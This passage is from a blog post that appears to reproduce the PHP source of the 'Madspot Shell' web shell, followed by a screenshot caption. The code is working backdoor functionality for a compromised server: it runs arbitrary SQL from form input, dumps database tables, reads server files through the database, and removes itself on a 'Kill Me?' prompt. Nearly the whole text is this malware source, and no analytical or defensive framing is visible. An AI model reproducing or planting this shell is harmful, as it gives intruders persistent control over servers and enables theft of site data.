                    echo "&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;";
                            if(!empty($_POST['sql_base'])){
                                    $db-&gt;selectdb($_POST['sql_base']);
                                    echo "&lt;tr&gt;&lt;td width=1 style='border-top:2px solid #666;'&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;";
                                    $tbls_res = $db-&gt;listTables();
                                    while($item = $db-&gt;fetch($tbls_res)) {
                                            list($key, $value) = each($item);
                        if(!empty($_POST['sql_count']))
                            $n = $db-&gt;fetch($db-&gt;query('SELECT COUNT(*) as n FROM '.$value.''));
                                            $value = htmlspecialchars($value);
                                            echo "&lt;nobr&gt;&lt;input type='checkbox' name='tbl[]' value='".$value."'&gt;&nbsp;&lt;a href=# onclick=\"st('".$value."',1)\"&gt;".$value."&lt;/a&gt;" . (empty($_POST['sql_count'])?'&nbsp;':" &lt;small&gt;({$n['n']})&lt;/small&gt;") . "&lt;/nobr&gt;&lt;br&gt;";
                                    }
                                    echo "&lt;input type='checkbox' onclick='is();'&gt; &lt;input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'&gt;&lt;br&gt;File path:&lt;input type=text name=file value='dump.sql'&gt;&lt;/td&gt;&lt;td style='border-top:2px solid #666;'&gt;";
                                    if(@$_POST['p1'] == 'select') {
                                            $_POST['p1'] = 'query';
                        $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
                                            $db-&gt;query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
                                            $num = $db-&gt;fetch();
                                            $pages = ceil($num['n'] / 30);
                        echo "&lt;script&gt;d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}&lt;/script&gt;&lt;span&gt;".$_POST['p2']."&lt;/span&gt; ({$num['n']} records) Page # &lt;input type=text name='p3' value=" . ((int)$_POST['p3']) . "&gt;";
                        echo " of $pages";
                        if($_POST['p3'] &gt; 1)
                            echo " &lt;a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'&gt;&lt; Prev&lt;/a&gt;";
                        if($_POST['p3'] &lt; $pages)
                            echo " &lt;a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'&gt;Next &gt;&lt;/a&gt;";
                        $_POST['p3']--;
                                            if($_POST['type']=='pgsql')
                                                    $_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
                                            else
                                                    $_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
                                            echo "&lt;br&gt;&lt;br&gt;";
                                    }
                                    if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
                                            $db-&gt;query(@$_POST['p2']);
                                            if($db-&gt;res !== false) {
                                                    $title = false;
                                                    echo '&lt;table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929"&gt;';
                                                    $line = 1;
                                                    while($item = $db-&gt;fetch())     {
                                                            if(!$title)     {
                                                                    echo '&lt;tr&gt;';
                                                                    foreach($item as $key =&gt; $value)
                                                                            echo '&lt;th&gt;'.$key.'&lt;/th&gt;';
                                                                    reset($item);
                                                                    $title=true;
                                                                    echo '&lt;/tr&gt;&lt;tr&gt;';
                                                                    $line = 2;
                                                            }
                                                            echo '&lt;tr class="l'.$line.'"&gt;';
                                                            $line = $line==1?2:1;
                                                            foreach($item as $key =&gt; $value) {
                                                                    if($value == null)
                                                                            echo '&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;';
                                                                    else
                                                                            echo '&lt;td&gt;'.nl2br(htmlspecialchars($value)).'&lt;/td&gt;';
                                                            }
                                                            echo '&lt;/tr&gt;';
                                                    }
                                                    echo '&lt;/table&gt;';
                                            } else {
                                                    echo '&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; '.htmlspecialchars($db-&gt;error()).'&lt;/div&gt;';
                                            }
                                    }
                                    echo "&lt;br&gt;&lt;/form&gt;&lt;form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'&gt;&lt;textarea name='query' style='width:100%;height:100px'&gt;";
                    if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                        echo htmlspecialchars($_POST['p2']);
                    echo "&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value='Execute'&gt;";
                                    echo "&lt;/td&gt;&lt;/tr&gt;";
                            }
                            echo "&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;";
                if($_POST['type']=='mysql') {
                    $db-&gt;query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                    if($db-&gt;fetch())
                        echo "&lt;form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;";
                }
                            if(@$_POST['p1'] == 'loadfile') {
                                    $file = $db-&gt;loadFile($_POST['p2']);
                                    echo '&lt;pre class=ml1&gt;'.htmlspecialchars($file['file']).'&lt;/pre&gt;';
                            }
            } else {
            echo htmlspecialchars($db-&gt;error());
        }
            echo '&lt;/div&gt;';
        madfooter();

     }

     function madselfrm()
     {

        if($_POST['p1'] == 'yes')
                    if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
                            die('Shell has been removed');
                    else
                            echo 'unlink error!';
        if($_POST['p1'] != 'yes')
            madhead();
            echo "&lt;div class=header&gt;&lt;pre class=ml1 style='margin-top:5px'&gt;";


        echo "

                   /^\
          _.-`:   /   \   :'-._
        ,`    :  |     |  :    '.
      ,`       \,|     |,/       '.
     /           `-...-`           \
    :              .'.              :
    |             . ' .             |
    |             ' . '             |
    :              '.'              :
     \           ,-'''-,           /
      `.       /'|     |'\       ,'
        `._   ;  |     |  ;   _,'
           `-.:  |     |  :,-'
                 |     |
                 |     |
                 |     |
                 |     |
                 |     |
    ";



        echo '&lt;br&gt;Kill Me?&lt;br&gt;&lt;a href=# onclick="g(null,null,\'yes\')"&gt;Yes&lt;/a&gt;&lt;/div&gt;';
            madFooter();

     }


    if( empty($_POST['a']) )
            if(isset($default_action) && function_exists('mad' . $default_action))
                    $_POST['a'] = $default_action;
            else
                    $_POST['a'] = 'FilesMan';
    if( !empty($_POST['a']) && function_exists('mad' . $_POST['a']) )
            call_user_func('mad' . $_POST['a']);
            exit;
    ?>


    {% endhighlight %}

A screenshot of Madspot Shell in action.  
<figure id="attachment_380" style="width: 604px;" class="wp-caption aligncenter">[<img src="{{ site.baseurl }}/wp-content/uploads/2014/03/madspot-shell-1024x540.png" alt="madspot shell screenshot" width="604" height="318" class="size-large wp-image-380" />][1]<figcaption class="wp-caption-text">Screenshot of the Madspot shell</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/03/madspot-shell.png
